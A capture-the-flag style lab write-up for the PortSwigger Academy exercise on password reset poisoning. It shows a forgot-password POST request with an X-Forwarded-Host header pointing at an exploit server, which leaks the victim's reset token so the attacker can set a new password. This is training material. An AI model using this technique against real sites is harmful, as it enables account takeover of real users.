# Password Reset Poisoning via Middleware

This lab is susceptible to password reset poisoning. The user carlos is modeled to click on any link that arrives in his inbox without question.

**Goal:** Log into Carlos's account.

Login credentials for your own account: wiener:peter. Any email sent to this account can be read through the email client on the exploit server.

---

**Reference:**
- https://portswigger.net/web-security/authentication/other-mechanisms

pic 1

---

Requesting a password change generates a POST request:

pic 2

The link it produces is: `https://0a12001204e7e3e982ef202200a10043.web-security-academy.net/forgot-password?temp-forgot-password-token=JiMwnEiWPtqhfR5EAaUObelEM6CE11uK`:

pic 3

By adding an `X-Forwarded-Host` header, the domain embedded in that emailed link can be poisoned to point at the exploit server:

```
POST /forgot-password HTTP/2
...
X-Forwarded-Host: exploit-0a870063038466fd80799d71012c004f.exploit-server.net

username=carlos
```

pic 4

As a result, a request shows up on the exploit server:

pic 5

This lets us use that poisoned link to set a new password for carlos:

pic 6
pic 7
